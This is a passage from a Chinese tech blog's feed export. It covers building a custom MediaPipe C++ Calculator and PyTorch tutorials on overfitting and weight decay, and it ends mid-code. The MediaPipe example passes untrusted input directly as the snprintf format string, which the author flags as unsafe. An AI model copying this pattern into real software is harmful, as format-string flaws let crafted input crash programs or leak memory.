Caculator(Node)
  上面不是介绍了Graph和Packet嘛，这里的Calculator就是Graph里面的节点，也是处理Packet的具体单元。可以具备多输入输出。
  实例代码片段：
//比如mediapipe/calculators/core/pass_through_calculator.h里面的定义，这个Calculator被Helloworld这个例子使用，作用就是把输入的数据直接传递到输出，不做任何处理，类似NOP
class PassThroughCalculator : public CalculatorBase 


Stream
  Stream 就是 Caculator 之间的连接起来后，形成的一个数据流动路径。


Side packets
  Side packets 可以直接理解为一些静态的数据packet，在graph创建之后就不会改变的数据。
… …




自定义实现Calculator

  Talk is cheap, show me the code.
/*
 * @Description: 
 * @Author: Sky
 * @Date: 
 * @LastEditors: Sky
 * @LastEditTime: 
 * @Github: 
 */
#include &lt;cstdio>
#include "mediapipe/framework/calculator_graph.h"
#include "mediapipe/framework/port/logging.h"
#include "mediapipe/framework/port/parse_text_proto.h"
#include "mediapipe/framework/port/status.h"

//customer calculator
#include "mediapipe/framework/calculator_framework.h"
#include "mediapipe/framework/port/canonical_errors.h"


class CustomerDataType&#123;

  public:
  CustomerDataType(int i, float f, bool b, const std::string &amp; str):
  val_i(i),
  val_f(f),
  val_b(b),
  s_str(str)
  &#123;&#125;
  int val_i = 1;
  float val_f = 11.f;
  bool val_b = true;
  std::string s_str = "customer str.";
&#125;;



namespace mediapipe &#123;

  class MyStringProcessCalculator : public CalculatorBase &#123;
  public:
    /*
    Calculator authors can specify the expected types of inputs and outputs of a calculator in GetContract(). 
    When a graph is initialized, the framework calls a static method to verify if the packet types of the connected inputs and outputs match the information in this specification.
    */
    static absl::Status GetContract(CalculatorContract* cc) &#123;
      
      /*
      class InputStreamShard;
      typedef internal::Collection&lt;InputStreamShard> InputStreamShardSet;
      class OutputStreamShard;
      typedef internal::Collection&lt;OutputStreamShard> OutputStreamShardSet;
      */
      //cc->Inputs().NumEntries() returns the number of input streams
      // if (!cc->Inputs().TagMap()->SameAs(*cc->Outputs().TagMap())) &#123;

      //   return absl::InvalidArgumentError("Input and output streams's TagMap can't be same.");
      // &#125;

      //set stream
      // for (CollectionItemId id = cc->Inputs().BeginId(); id &lt; cc->Inputs().EndId(); ++id) &#123;

      //   cc->Inputs().Get(id).SetAny();
      //   cc->Outputs().Get(id).SetSameAs(&amp;cc->Inputs().Get(id));
      // &#125;
      cc->Inputs().Index(0).SetAny();
      cc->Inputs().Index(1).Set&lt;CustomerDataType>();

      cc->Outputs().Index(0).SetSameAs(&amp;cc->Inputs().Index(0));


      //set stream package
      // for (CollectionItemId id = cc->InputSidePackets().BeginId(); id &lt; cc->InputSidePackets().EndId(); ++id) &#123;
        
      //   cc->InputSidePackets().Get(id).SetAny();
      // &#125;
      // cc->InputSidePackets().Index(0).SetAny();
      // cc->InputSidePackets().Index(1).Set&lt;CustomerDataType>();//set customer data-type


      if (cc->OutputSidePackets().NumEntries() != 0) &#123;

        // if (!cc->InputSidePackets().TagMap()->SameAs(*cc->OutputSidePackets().TagMap())) &#123;

        //   return absl::InvalidArgumentError("Input and output side packets's TagMap can't be same.");
        // &#125;
        
        // for (CollectionItemId id = cc->InputSidePackets().BeginId(); id &lt; cc->InputSidePackets().EndId(); ++id) &#123;

        //   cc->OutputSidePackets().Get(id).SetSameAs(&amp;cc->InputSidePackets().Get(id));
        // &#125;

        cc->OutputSidePackets().Index(0).SetSameAs(&amp;cc->InputSidePackets().Index(0));
      &#125;      

      return absl::OkStatus();
    &#125;

    absl::Status Open(CalculatorContext* cc) final &#123;

      for (CollectionItemId id = cc->Inputs().BeginId();id &lt; cc->Inputs().EndId(); ++id) &#123;

        if (!cc->Inputs().Get(id).Header().IsEmpty()) &#123;

          cc->Outputs().Get(id).SetHeader(cc->Inputs().Get(id).Header());
        &#125;
      &#125;

      if (cc->OutputSidePackets().NumEntries() != 0) &#123;

        for (CollectionItemId id = cc->InputSidePackets().BeginId(); id &lt; cc->InputSidePackets().EndId(); ++id) &#123;
          
          cc->OutputSidePackets().Get(id).Set(cc->InputSidePackets().Get(id));
        &#125;
      &#125;

      // Sets this packet timestamp offset for Packets going to all outputs.
      // If you only want to set the offset for a single output stream then
      // use OutputStream::SetOffset() directly.
      cc->SetOffset(TimestampDiff(0));

      return absl::OkStatus();
    &#125;

    absl::Status Process(CalculatorContext* cc) final &#123;

      if (cc->Inputs().NumEntries() == 0) &#123;
        return tool::StatusStop();
      &#125;

      //get node input data
      mediapipe::Packet  _data0 = cc->Inputs().Index(0).Value();
      mediapipe::Packet  _data1 = cc->Inputs().Index(1).Value();

      //not safety.
      char _tmp_buf[1024];
      
      ::memset(_tmp_buf, 0, 1024);

      snprintf(_tmp_buf, 1024, _data0.Get&lt;std::string>().c_str(), _data1.Get&lt;CustomerDataType>().val_i, _data1.Get&lt;CustomerDataType>().val_f, _data1.Get&lt;CustomerDataType>().val_b, _data1.Get&lt;CustomerDataType>().s_str.c_str());

      std::string _out_data = _tmp_buf;
      cc->Outputs().Index(0).AddPacket(MakePacket&lt;std::string>(_out_data).At(cc->InputTimestamp()));

      return absl::OkStatus();
    &#125;

    absl::Status Close(CalculatorContext* cc) final &#123; 

      return absl::OkStatus(); 
    &#125;
  &#125;;

  REGISTER_CALCULATOR(MyStringProcessCalculator);
&#125;




namespace mediapipe &#123;

  absl::Status  RunMyGraph() &#123;

    // Configures a simple graph, which concatenates 2 PassThroughCalculators.
    CalculatorGraphConfig config = ParseTextProtoOrDie&lt;CalculatorGraphConfig>(R"(
      input_stream: "in"
      input_stream: "customer_in"
      output_stream: "out"
      node &#123;
        calculator: "PassThroughCalculator"
        input_stream: "in"
        output_stream: "out1"
      &#125;
      node &#123;
        calculator: "MyStringProcessCalculator"
        input_stream: "out1"
        input_stream: "customer_in"
        output_stream: "out2"        
      &#125;      
      node &#123;
        calculator: "PassThroughCalculator"
        input_stream: "out2"
        output_stream: "out"
      &#125;
    )");
    LOG(INFO)&lt;&lt;"parse graph cfg-str done ... ...";

    CalculatorGraph graph;
    MP_RETURN_IF_ERROR(graph.Initialize(config));
    LOG(INFO)&lt;&lt;"init graph done ... ...";

    ASSIGN_OR_RETURN(OutputStreamPoller poller,
                    graph.AddOutputStreamPoller("out"));
    LOG(INFO)&lt;&lt;"add out-node to output-streampoller done ... ...";


    MP_RETURN_IF_ERROR(graph.StartRun(&#123;&#125;));
    LOG(INFO)&lt;&lt;"start run graph done ... ...";
    

    // Give 10 input packets that contains the same std::string "Hello World!".
    for (int i = 0; i &lt; 10; ++i) &#123;

      MP_RETURN_IF_ERROR(graph.AddPacketToInputStream(
          "in", MakePacket&lt;std::string>("CustomerCalculator: val_i %d, val_f %f, val_b %d, val_str %s").At(Timestamp(i))));

      MP_RETURN_IF_ERROR(graph.AddPacketToInputStream(
          "customer_in", MakePacket&lt;CustomerDataType>(i, i + 1.f, i%2==0, "s" + std::to_string(i)).At(Timestamp(i))));
    &#125;
    // Close the input stream "in".
    MP_RETURN_IF_ERROR(graph.CloseInputStream("in"));
    MP_RETURN_IF_ERROR(graph.CloseInputStream("customer_in"));

    mediapipe::Packet packet;
    // Get the output packets std::string.
    while (poller.Next(&amp;packet)) &#123;
      LOG(INFO) &lt;&lt; packet.Get&lt;std::string>();
    &#125;

    LOG(INFO)&lt;&lt;"RunGraph Done";
    return graph.WaitUntilDone();
  &#125;

&#125;  // namespace mediapipe



int main(int argc, char** argv) &#123;
  
  gflags::ParseCommandLineFlags(&amp;argc, &amp;argv, true);

  FLAGS_minloglevel = 0;
  FLAGS_stderrthreshold = 0;
  FLAGS_alsologtostderr = 1;

  google::InitGoogleLogging(argv[0]);

  LOG(INFO) &lt;&lt; "glog init success ... ...";

  absl::Status run_status = mediapipe::RunMyGraph();
  if (!run_status.ok())
    LOG(ERROR) &lt;&lt; "Failed to run the graph: " &lt;&lt; run_status.message();

  google::ShutdownGoogleLogging();
  return 0;
&#125;
下面简单介绍这段代码。


自定义Calculator：MyStringProcessCalculator
   这里自定义了一个Calculator，主要作用就是传入snprintf的fmt字符串和fmt字符串所需要的数据。所以可以看到有两个输入，一个是string，一个是我自定义的data-type。输出是一个格式化之后的字符串，所以输出是string。
   自定义Calculator主要还是实现4个接口，分别是GetContract，Open，Process，Close。其中GetContract是Graph初始化的时候，检查Calculator用的。Open接口是在Graph开始后，对Calculator做一些初始化工作，例如设定一些Calculator初始状态等。Process是实际的Calculator功能。
namespace mediapipe &#123;

  class MyStringProcessCalculator : public CalculatorBase &#123;
  public:
    /*
    Calculator authors can specify the expected types of inputs and outputs of a calculator in GetContract(). 
    When a graph is initialized, the framework calls a static method to verify if the packet types of the connected inputs and outputs match the information in this specification.
    */
    static absl::Status GetContract(CalculatorContract* cc) &#123;
      
      /*
      class InputStreamShard;
      typedef internal::Collection&lt;InputStreamShard> InputStreamShardSet;
      class OutputStreamShard;
      typedef internal::Collection&lt;OutputStreamShard> OutputStreamShardSet;
      */
      //cc->Inputs().NumEntries() returns the number of input streams
      // if (!cc->Inputs().TagMap()->SameAs(*cc->Outputs().TagMap())) &#123;

      //   return absl::InvalidArgumentError("Input and output streams's TagMap can't be same.");
      // &#125;

      //set stream
      // for (CollectionItemId id = cc->Inputs().BeginId(); id &lt; cc->Inputs().EndId(); ++id) &#123;

      //   cc->Inputs().Get(id).SetAny();
      //   cc->Outputs().Get(id).SetSameAs(&amp;cc->Inputs().Get(id));
      // &#125;
      cc->Inputs().Index(0).SetAny();
      cc->Inputs().Index(1).Set&lt;CustomerDataType>();

      cc->Outputs().Index(0).SetSameAs(&amp;cc->Inputs().Index(0));


      //set stream package
      // for (CollectionItemId id = cc->InputSidePackets().BeginId(); id &lt; cc->InputSidePackets().EndId(); ++id) &#123;
        
      //   cc->InputSidePackets().Get(id).SetAny();
      // &#125;
      // cc->InputSidePackets().Index(0).SetAny();
      // cc->InputSidePackets().Index(1).Set&lt;CustomerDataType>();//set customer data-type


      if (cc->OutputSidePackets().NumEntries() != 0) &#123;

        // if (!cc->InputSidePackets().TagMap()->SameAs(*cc->OutputSidePackets().TagMap())) &#123;

        //   return absl::InvalidArgumentError("Input and output side packets's TagMap can't be same.");
        // &#125;
        
        // for (CollectionItemId id = cc->InputSidePackets().BeginId(); id &lt; cc->InputSidePackets().EndId(); ++id) &#123;

        //   cc->OutputSidePackets().Get(id).SetSameAs(&amp;cc->InputSidePackets().Get(id));
        // &#125;

        cc->OutputSidePackets().Index(0).SetSameAs(&amp;cc->InputSidePackets().Index(0));
      &#125;      

      return absl::OkStatus();
    &#125;

    absl::Status Open(CalculatorContext* cc) final &#123;

      for (CollectionItemId id = cc->Inputs().BeginId();id &lt; cc->Inputs().EndId(); ++id) &#123;

        if (!cc->Inputs().Get(id).Header().IsEmpty()) &#123;

          cc->Outputs().Get(id).SetHeader(cc->Inputs().Get(id).Header());
        &#125;
      &#125;

      if (cc->OutputSidePackets().NumEntries() != 0) &#123;

        for (CollectionItemId id = cc->InputSidePackets().BeginId(); id &lt; cc->InputSidePackets().EndId(); ++id) &#123;
          
          cc->OutputSidePackets().Get(id).Set(cc->InputSidePackets().Get(id));
        &#125;
      &#125;

      // Sets this packet timestamp offset for Packets going to all outputs.
      // If you only want to set the offset for a single output stream then
      // use OutputStream::SetOffset() directly.
      cc->SetOffset(TimestampDiff(0));

      return absl::OkStatus();
    &#125;
    //这里是整个Calculator的核心，就是调用snprintf
    absl::Status Process(CalculatorContext* cc) final &#123;

      if (cc->Inputs().NumEntries() == 0) &#123;
        return tool::StatusStop();
      &#125;

      //get node input data
      mediapipe::Packet  _data0 = cc->Inputs().Index(0).Value();
      mediapipe::Packet  _data1 = cc->Inputs().Index(1).Value();

      //not safety.
      char _tmp_buf[1024];
      
      ::memset(_tmp_buf, 0, 1024);

      snprintf(_tmp_buf, 1024, _data0.Get&lt;std::string>().c_str(), _data1.Get&lt;CustomerDataType>().val_i, _data1.Get&lt;CustomerDataType>().val_f, _data1.Get&lt;CustomerDataType>().val_b, _data1.Get&lt;CustomerDataType>().s_str.c_str());

      std::string _out_data = _tmp_buf;
      cc->Outputs().Index(0).AddPacket(MakePacket&lt;std::string>(_out_data).At(cc->InputTimestamp()));

      return absl::OkStatus();
    &#125;

    absl::Status Close(CalculatorContext* cc) final &#123; 

      return absl::OkStatus(); 
    &#125;
  &#125;;

  REGISTER_CALCULATOR(MyStringProcessCalculator);
&#125;


然后开始编译运行得到结果
   编译。

# 注意，这里的--check_visibility=false 为了关闭bazel关于target之间的可见性检查，因为我的Calculator自定义放在我自己的目录的，有一个target对这个目录不可见，编译会报错。

bazel build -c dbg --define MEDIAPIPE_DISABLE_GPU=1 --copt -DMESA_EGL_NO_X11_HEADERS --copt -DEGL_NO_X11 my_target --check_visibility=false --verbose_failures  --local_cpu_resources=1
   然后运行。得到如下图的结果。

    
        
    
   




后记

  好了，一个超级简单的自定义calculator已经实现了，相信你已经明白了吧。本系列也就此终结吧，以后随缘更新。





    
        
        打赏、订阅、收藏、丢香蕉、硬币，请关注公众号（攻城狮的搬砖之路）
    


    
        
    


PS: 请尊重原创，不喜勿喷。
PS: 要转载请注明出处，本人版权所有。
PS: 有问题请留言，看到后我会第一时间回复。
]]></content>
      <categories>
        <category>C&amp;CPP</category>
        <category>嵌入式</category>
        <category>linux开发</category>
        <category>DL</category>
      </categories>
      <tags>
        <tag>CPP</tag>
        <tag>深度学习</tag>
        <tag>神经网络</tag>
        <tag>自定义算子</tag>
      </tags>
  </entry>
  <entry>
    <title>DL基础补全计划(三)---模型选择、欠拟合、过拟合</title>
    <url>/2021/07/18/blog_idx_107/</url>
    <content><![CDATA[ 
PS：要转载请注明出处，本人版权所有。
PS: 这个只是基于《我自己》的理解，如果和你的原则及想法相冲突，请谅解，勿喷。

环境说明


Windows 10


VSCode


Python 3.8.10


Pytorch 1.8.1


Cuda 10.2


前言

  在前文中，我们已经接触了两种回归模型，也接触了深度学习中的一些常见的概念。其中有趣的信息是，我们在《DL基础补全计划(二)—Softmax回归及示例（Pytorch，交叉熵损失）》中已经发现了，在softmax回归的时候，我们使用一个线性的隐藏层在其数据集上都能够达到不错的不错的准确率，这里的不错是指瞎猜和我们的模型推测的准确率，一个是10%，一个是80%左右。这至少说明了我们这个分类模型是有效的。其实后续我们就会更换线性隐藏层为其他层来实现我们的模型，比如：CNN、RNN等等，不同的隐藏层是后续我们要接触和学习的内容，这里不先做详解。
  我们假设我们已经设计出了许多的不同隐藏层的模型，这个时候有一个重要的问题就是选择哪一个模型为我们实际的要应用的模型，本文将会介绍一些方法来实现怎么选择模型的问题。




一些基本概念简介

  基本概念简介：


训练误差 是指模型在参数更新后，在训练集上做一次测试，算出的和真实值的误差。


泛化误差 是指模型在真实数据分布下，算出的和真实值的误差，但是一般情况下数据是无穷多的，我们只能够采集一些真实数据，并算出泛化误差。常见的情况是我们构造一个测试集来计算泛化误差。


欠拟合 模型拟合能力差，训练误差和泛化误差差异小，但是两个误差都比较大，一般来说，就是模型基本没有学习到我们需要学习的规律和特征。


过拟合 训练误差小，泛化误差大。一般来说就是在训练集上学习的太过分了，类似强行记住了训练集上的所有规律和特征，导致泛化能力太弱了。


  一般来说欠拟合的话，就是换网络，加深加大网络等解决问题，欠拟合其实很明显，解决方向比较明确。
  其实我们更多是遇到过拟合，因为随着发展，我们的模型越来越深和宽，但是我们能够收集到的数据是有限的，导致了我们的模型可能出现‘死记硬背’下我们的训练集，然后泛化能力就令人担忧，为了缓解这个问题，后续我们将会介绍几种缓解过拟合的方法。
  下面我们将会通过一个实例来体会一下正常拟合、欠拟合、过拟合。




一个正常拟合、过拟合、欠拟合的实例

  这里我们通过pytorch的高级API来设计一个线性规划的实例。
  首先通过如下的代码生成$Y=(X^3/3!)*W1 + (X^2/2!)W2 + XW3 + b + \epsilon, \epsilon=N(0, 0.1^2)$的特征和标签。
def synthetic_data(w, num_examples): #@save
    """⽣成y = (X1^3/3!)*W1 + (X2^2/2!)*W1 + X3*W3 + b + 噪声。"""

    X = np.random.normal(0, 1, (num_examples, 1))

    y = np.dot(X**3/np.math.factorial(3), w[0]) + np.dot(X**2/np.math.factorial(2), w[1]) + np.dot(X/np.math.factorial(1), w[2]) + w[3]
    
    # 噪声
    y += np.random.normal(0, 0.1, y.shape)
    
    return X, y.reshape((-1, 1))
  然后通过自定义Pytorch层，通过传入参数N，计算N项多项式的结果。
class TestLayer(nn.Module):
    def __init__(self, n, **kwargs):
        super(TestLayer, self).__init__(**kwargs)
        self.n = n
        self.w_array = nn.Parameter(torch.tensor( np.random.normal(0, 0.1, (1, n))).reshape(-1, 1))
        self.b = nn.Parameter(torch.tensor(np.random.normal(0, 0.1, 1)))

    def cal(self, X, n):
        X = X.reshape(batch_size, 1, 1)
        Y = self.b
        for i in range(n):
            # print(X.shape)
            # print(self.w_array.shape)
            # print(Y.shape)

            Y  = Y + torch.matmul(X**(i + 1)/torch.tensor(np.math.factorial(i + 1)), self.w_array[i])
        return Y

    def forward(self, x):
        return self.cal(x, self.n)


class TestNet(nn.Module):
    def __init__(self, n):
        super(TestNet, self).__init__()
        self.test_net = nn.Sequential(
            TestLayer(n)
        )   

    def forward(self, x):
        return self.test_net(x)
  最终完整代码如下：
import torch
from torch import nn
import numpy as np
import matplotlib.pyplot as plt
from torch.utils import data
from matplotlib.pyplot import MultipleLocator

fig, ax = plt.subplots()
xdata0, ydata0 = [], []
xdata1, ydata1 = [], []
line0, = ax.plot([], [], 'r-', label='TrainError')
line1, = ax.plot([], [], 'b-', label='TestError')


def init_and_show():
    ax.set_xlabel('epoch')
    ax.set_ylabel('loss')
    ax.set_title('Train/Test Loss')
    ax.set_xlim(0, epochs)
    ax.set_ylim(0.05, 100)
    ax.set_yscale('log')
    # y_locator = MultipleLocator(0.1)
    # ax.yaxis.set_major_locator(y_locator)
    ax.legend([line0, line1], ('TrainError', 'TestError'))
    
    # ax.legend([line1], ('TestError', ))
    line0.set_data(xdata0, ydata0)
    line1.set_data(xdata1, ydata1)

    plt.show()



def synthetic_data(w, num_examples): #@save
    """⽣成y = X1^3*W1 + X2^2*W1 + X3*W3 + b + 噪声。"""

    X = np.random.normal(0, 1, (num_examples, 1))

    y = np.dot(X**3/np.math.factorial(3), w[0]) + np.dot(X**2/np.math.factorial(2), w[1]) + np.dot(X/np.math.factorial(1), w[2]) + w[3]
    
    # 噪声
    y += np.random.normal(0, 0.1, y.shape)
    
    return X, y.reshape((-1, 1))



class TestLayer(nn.Module):
    def __init__(self, n, **kwargs):
        super(TestLayer, self).__init__(**kwargs)
        self.n = n
        self.w_array = nn.Parameter(torch.tensor( np.random.normal(0, 0.1, (1, n))).reshape(-1, 1))
        self.b = nn.Parameter(torch.tensor(np.random.normal(0, 0.1, 1)))

    def cal(self, X, n):
        X = X.reshape(batch_size, 1, 1)
        Y = self.b
        for i in range(n):
            # print(X.shape)
            # print(self.w_array.shape)
            # print(Y.shape)

            Y  = Y + torch.matmul(X**(i + 1)/torch.tensor(np.math.factorial(i + 1)), self.w_array[i])
        return Y

    def forward(self, x):
        return self.cal(x, self.n)


class TestNet(nn.Module):
    def __init__(self, n):
        super(TestNet, self).__init__()
        self.test_net = nn.Sequential(
            TestLayer(n)
        )   

    def forward(self, x):
        return self.test_net(x)

# copy from d2l/torch.py
def load_array(data_arrays, batch_size, is_train=True):
    """Construct a PyTorch data iterator."""
    dataset = data.TensorDataset(*data_arrays)
    return data.DataLoader(dataset, batch_size, shuffle=is_train)

# def data_loader(batch_size, features, labels):
#     num_examples = len(features)
#     indices = list(range(num_examples))
#     np.random.shuffle(indices) # 样本的读取顺序是随机的

#     for i in range(0, num_examples, batch_size):
#         j = np.array(indices[i: min(i + batch_size, num_examples)])
#         yield torch.tensor(features.take(j, 0)), torch.tensor(labels.take(j)) # take函数根据索引返回对应元素

def train(dataloader, model, loss_fn, optimizer):
    size = train_examples
    num_batches = train_examples / batch_size
    train_loss_sum = 0
    for batch, (X, y) in enumerate(dataloader):
        # move X, y to gpu
        if torch.cuda.is_available():
            X = X.to('cuda')
            y = y.to('cuda')
        # Compute prediction and loss
        pred = model(X)
        loss = loss_fn(pred, y)

        # Backpropagation
        optimizer.zero_grad()
        loss.backward()
        optimizer.step()

        train_loss_sum += loss.item()
        
        if batch % 5 == 0:
            loss, current = loss.item(), batch * len(X)
            print(f"loss: &#123;loss:>7f&#125;  [&#123;current:>5d&#125;/&#123;size:>5d&#125;]")
    
    print(f"Train Error: \n Avg loss: &#123;train_loss_sum/num_batches:>8f&#125; \n")
    return train_loss_sum/num_batches


def test(dataloader, model, loss_fn):
    num_batches = test_examples / batch_size
    test_loss = 0
    with torch.no_grad():
        for X, y in dataloader:
            # move X, y to gpu
            if torch.cuda.is_available():
                X = X.to('cuda')
                y = y.to('cuda')
            pred = model(X)
            test_loss += loss_fn(pred, y).item()

    test_loss /= num_batches
    print(f"Test Error: \n Avg loss: &#123;test_loss:>8f&#125; \n")

    return test_loss
    
if __name__ == '__main__':
    device = 'cuda' if torch.cuda.is_available() else 'cpu'
    print('Using &#123;&#125; device'.format(device))
    
    true_w1 = [1.65]

    true_w2 = [-2.46]

    true_w3 = [3.54]

    true_b = 0.78    

    test_examples = 100
    train_examples = 100
    
    num_examples = test_examples + train_examples

    f1, labels = synthetic_data([true_w1, true_w2, true_w3, true_b], num_examples)
    print(f1.shape)
    print(labels.shape)

    num_weight = 3

    l1_loss_fn = torch.nn.MSELoss()
    
    learning_rate = 0.01

    model = TestNet(num_weight)

    optimizer = torch.optim.SGD(model.parameters(), lr=learning_rate)

    model = model.to(device)
    print(model)

    epochs = 1500

    model.train()


    batch_size = 10

    train_data = (torch.tensor(f1[:train_examples,]), torch.tensor(labels[:train_examples,]))
    test_data = (torch.tensor(f1[train_examples:,]), torch.tensor(labels[train_examples:,]))

    train_dataloader = load_array(train_data ,batch_size, True)
    test_dataloader = load_array(test_data ,batch_size, True)
    # verify dataloader
    # for x,y in train_dataloader:
    #     print(x.shape)
    #     print(y.shape)
    #     print(torch.matmul(x**3, torch.tensor(true_w1, dtype=torch.double)) + torch.matmul(x**2, torch.tensor(true_w2, dtype=torch.double)) + torch.matmul(x, torch.tensor(true_w3, dtype=torch.double)) + true_b)
    #     print(y)
    #     break

    model.train()
    for t in range(epochs):
        print(f"Epoch &#123;t+1&#125;\n-------------------------------")
        train_l = train(train_dataloader, model, l1_loss_fn, optimizer)
        test_l = test(test_dataloader, model, l1_loss_fn)
        ydata0.append(train_l*10)
        ydata1.append(test_l*10)
        xdata0.append(t)
        xdata1.append(t)
    print("Done!")

    init_and_show()

    param_iter = model.parameters()
    print('W = ')
    print(next(param_iter)[: num_weight, :])
    print('b = ')
    print(next(param_iter))
  注意，此最终代码首先生成了100个训练集和100个测试集。通过num_weight可以控制参与训练的多项式个数，话句话说，可以控制参与拟合训练的参数个数。下面通过三个说明我们来看看，不同num_weight下，TrainErr和TestErr和迭代次数，参与拟合训练的参数的关系。


正常拟合(num_weight = 3)
  当num_weight = 3时，运行我们的训练脚本，我们可以清楚的看到，我们拟合出来的结果和我们的真实参数是几乎一样的。同时我们也可以看到TrainErr和TestErr快速的收敛接近0而且差别不是很大。

    
        
    
    


欠拟合(num_weight = 1)
  当num_weight = 1时，运行我们的训练脚本，我们可以清楚的看到，损失图像到了一定程度就不下降了，不能够收敛。

    
        
    
    
过拟合(num_weight = 20)
  当num_weight = 20时，按照我们的猜测，我们的模型应该会出现过拟合。
  正常过拟合现象, 注意观察最终输出前面3项的w和b和真实w和b存在差异。

    
        
    
    
  从我多次的实验的结果来看，除了上面的真实出现的过拟合情况，还有一些情况是，不会出现过拟合现象，如下图。注意观察最终输出前面3项的w和b和真实w和b。

    
        
    
 
  我们通过观察，发现了w的4到20项参数接近于0，前面3项的w和b和真实w和b是比较接近的，因此我们猜测没有出现过拟合的原因是w的4到20项的权重在整个表达式中占比非常小，因此不会过拟合。可以直接理解为w的4到20项的权重为0。
  注意过拟合这个例子，需要多次运行才会出现过拟合现象，其是波动的，其实就是我们初始化的参数充满了随机性，导致了不容易收敛。而欠拟合和正常拟合的例子不管你怎么运行，都能稳定的得到结果。




后记

  这里我们从模型选择的角度出发，发现了我们训练的过程中会出现的3种现象，欠拟合，正常拟合，过拟合。其中正常拟合状态下的模型是我们需要的。
  对于欠拟合来说，就是参与训练的参数少了，换句话说我们的模型太简单了，不能够代表我们要学习的特征，导致完全不能够收敛。
  对于过拟合来说，远不止我们看到的这么简单和清晰。在这里我们只是看到了一个主要的导致训练出现大波动的原因就是参数过多，这种情况下会出现过拟合现象。由于在后面的模型中，参数都是成百上千，我们不可能一个个尝试，因此在后续，我们还会学习一些手段来抑制过拟合现象。
  这里我们也要引出一个问题，我们知道模型的复杂度（参数个数）在一个特定数据集上可能会导致过拟合，那么我们除了控制模型复杂度之外，还有其他的方案可以选择吗?
参考文献


https://github.com/d2l-ai/d2l-zh/releases (V1.0.0)


https://github.com/d2l-ai/d2l-zh/releases (V2.0.0 alpha1)







    
        
        打赏、订阅、收藏、丢香蕉、硬币，请关注公众号（攻城狮的搬砖之路）
    


    
        
    


PS: 请尊重原创，不喜勿喷。
PS: 要转载请注明出处，本人版权所有。
PS: 有问题请留言，看到后我会第一时间回复。
]]></content>
      <categories>
        <category>DL</category>
        <category>计算机视觉</category>
      </categories>
      <tags>
        <tag>拟合</tag>
      </tags>
  </entry>
  <entry>
    <title>DL基础补全计划(四)---对抗过拟合：权重衰减、Dropout</title>
    <url>/2021/08/01/blog_idx_108/</url>
    <content><![CDATA[ 
PS：要转载请注明出处，本人版权所有。
PS: 这个只是基于《我自己》的理解，如果和你的原则及想法相冲突，请谅解，勿喷。

环境说明


Windows 10


VSCode


Python 3.8.10


Pytorch 1.8.1


Cuda 10.2


前言

  在《DL基础补全计划(三)—模型选择、欠拟合、过拟合》（ https://blog.csdn.net/u011728480/article/details/118881125 ）一文中，我们已经了解了我们训练过程中的一些现象，对于欠拟合问题我们一般是增加训练集大小。对于过拟合，我们也提供了一个解决方案，那就是限制模型的复杂度（参数个数）。
  在以后我们构造的模型里面，其参数都是成百上千的，如果通过限制参数（更换模型）来解决过拟合问题太简单粗暴了，于是我们需要一些更加细腻的手段来抑制过拟合。此外，我们还必须知道，我们增加训练集总是能够缓解过拟合的问题，但是这不是根本办法。于是深度学习大佬们又引出了其他的两个方案，他们分别是权重衰减和Dropout。
  到此为止，我们可以有如下的方法缓解过拟合问题：


控制模型复杂度


增大训练集


权重衰减


Dropout






权重衰减(L2正则化)

  其实书上对于权重衰减的定义还是比较好理解的，我们定义我们的模型为M(X)，当M(X)=0时，此时，我们的模型最简单，因为所有的输入都是0。我们最终想要的是M(X)的值越来越接近于0，那么我们权重的范数也需要越来越接近于0，这样M(X)的复杂度越来越小。
  出于以上的目的，我们可以将权重的范数给加到Loss函数结果里面去，通过BP算法，这样我们可以让权重的范数越来越接近于0。其中我们常用的L2范数，其可以限制权重中的大值，也可以使权重均匀分布，不会出现极端值，这是一般情况下我们想看到的。
  下面，我们通过一个实例及图示来感性的认知权重衰减。


实例代码
  首先我们设计了一个200个权重和1个偏置的数据生成器，加上噪声，得到我们数据集。这里我们采集了100个测试集和20个训练集。从这里我们马上就可以知道，这个肯定会过拟合，因为训练集太小了，而模型复杂度太大了。
  下面是完整代码：

import torch
from torch import nn
import numpy as np
import matplotlib.pyplot as plt
from torch.utils import data
from matplotlib.pyplot import MultipleLocator

fig, ax = plt.subplots()
xdata0, ydata0 = [], []
xdata1, ydata1 = [], []
line0, = ax.plot([], [], 'r-', label='TrainError')
line1, = ax.plot([], [], 'b-', label='TestError')


def init_and_show():
    ax.set_xlabel('epoch')
    ax.set_ylabel('loss')
    ax.set_title('Train/Test Loss')
    ax.set_xlim(0, epochs)
    ax.set_ylim(10e-5, 100)
    ax.set_yscale('log')
    # y_locator = MultipleLocator(0.1)
    # ax.yaxis.set_major_locator(y_locator)
    ax.legend([line0, line1], ('TrainError', 'TestError'))
    
    # ax.legend([line1], ('TestError', ))
    line0.set_data(xdata0, ydata0)
    line1.set_data(xdata1, ydata1)

    plt.show()

def l2_penalty(w, b = None):
    if b == None:
        return (w**2).sum() / 2
    else:
        return ((w**2).sum() + (b**2).sum()) / 2

def synthetic_data(true_w, true_b, num_examples): #@save
    """⽣成y = ax1 + bx2 + cx3 .... ....  + b + 噪声。"""

    X = np.random.normal(0, 1, (num_examples, len(true_w)))

    y = np.matmul(X, true_w) + true_b
    
    # 噪声
    y += np.random.normal(0, 0.1, y.shape)
    
    return X, y.reshape((-1, 1))



class TestNet(nn.Module):
    def __init__(self, input_nums):
        super(TestNet, self).__init__()
        self.test_net = nn.Sequential(
            # y=X*W+B
            # x.shape(batch_size, input_nums), w.shape(input_nums, output_nums)
            # y.shape(batch_size, output_nums)
            torch.nn.Linear(input_nums, 1)
        )   

    def forward(self, x):
        # print(x.dtype)
        # 
        return self.test_net(x)

# copy from d2l/torch.py
def load_array(data_arrays, batch_size, is_train=True):
    """Construct a PyTorch data iterator."""
    dataset = data.TensorDataset(*data_arrays)
    return data.DataLoader(dataset, batch_size, shuffle=is_train)

# def data_loader(batch_size, features, labels):
#     num_examples = len(features)
#     indices = list(range(num_examples))
#     np.random.shuffle(indices) # 样本的读取顺序是随机的

#     for i in range(0, num_examples, batch_size):
#         j = np.array(indices[i: min(i + batch_size, num_examples)])
#         yield torch.tensor(features.take(j, 0)), torch.tensor(labels.take(j)) # take函数根据索引返回对应元素

def train(dataloader, model, loss_fn, optimizer, lambda_val = 3):
    size = train_examples
    num_batches = train_examples / batch_size
    train_loss_sum = 0
    for batch, (X, y) in enumerate(dataloader):
        # move X, y to gpu
        if torch.cuda.is_available():
            X = X.to('cuda', dtype=torch.float32)
            y = y.to('cuda', dtype=torch.float32)
        # Compute prediction and loss
        pred = model(X)
        param_iter = model.parameters()
